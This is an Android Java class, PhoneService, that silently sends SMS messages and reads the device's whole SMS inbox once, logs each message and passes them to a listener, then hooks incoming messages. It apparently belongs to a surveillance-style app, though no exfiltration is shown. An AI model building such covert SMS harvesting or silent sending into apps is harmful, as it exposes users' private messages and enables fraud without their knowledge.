package com.fs.fs.api;

import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import android.text.TextUtils;

import com.fs.fs.bean.SMSInfo;
import com.fs.fs.receiver.SMSReceiver;
import com.fs.fs.utils.Constant;
import com.fs.fs.utils.DateUtils;
import com.fs.fs.utils.LogUtils;
import com.fs.fs.utils.SharePreferencesUtils;

import java.util.ArrayList;
import java.util.List;

/**
 * Created by wyx on 2016/12/30.
 */

public class PhoneService {
    private Context mContext = null;
    private SharePreferencesUtils mSharePreferences = null;


    public PhoneService(Context context) {
        this.mContext = context;
        this.mSharePreferences = SharePreferencesUtils.getIntance(context);
    }

    public interface SMSListener {
        void onGetAllSMS(List<SMSInfo> SMSInfo);

        void onReceive(SMSInfo msgInfo);
    }

    public SMSListener mSMSListener;


    public void sendSMSSilent(String phoneNumber, String content) {
        if (TextUtils.isEmpty(content)) return;
        PendingIntent sentIntent = PendingIntent.getBroadcast(mContext, 0, new Intent(), 0);
        SmsManager smsManager = SmsManager.getDefault();
        if (content.length() >= 70) {
            List<String> ms = smsManager.divideMessage(content);
            for (String str : ms) {
                smsManager.sendTextMessage(phoneNumber, null, str, sentIntent, null);
            }
        } else {
            smsManager.sendTextMessage(phoneNumber, null, content, sentIntent, null);
        }
    }

    public void getSMS(SMSListener listener) {
        mSMSListener = listener;
        Boolean isRead = (Boolean) mSharePreferences.get(Constant.SHARE_KEYS.SMS_READ, false);
        if (!isRead) {
            // 获取内容解析者
            ContentResolver resolver = mContext.getContentResolver();
            // 获取查询路径
            Uri uri = Uri.parse("content://sms");
            Cursor cursor = resolver.query(uri, new String[]{"address", "date", "body", "person"}, null, null, null);
            if (null != cursor) {
                List<SMSInfo> smsInfos = new ArrayList<>();
                while (cursor.moveToNext()) {
                    SMSInfo smsInfo = new SMSInfo();
                    smsInfo.phoneNumber = cursor.getString(cursor.getColumnIndex("address"));//手机号
                    smsInfo.person = cursor.getString(cursor.getColumnIndex("person"));//联系人姓名列表
                    smsInfo.content = cursor.getString(cursor.getColumnIndex("body"));
                    smsInfo.time = DateUtils.millis2String(cursor.getLong(cursor.getColumnIndex("date")));
                    smsInfos.add(smsInfo);
                    LogUtils.d(smsInfo.toString());
                }
                mSMSListener.onGetAllSMS(smsInfos);
                cursor.close();
                mSharePreferences.put(Constant.SHARE_KEYS.SMS_READ, true);
            }
        }
        SMSReceiver.setListener(listener);
    }


}
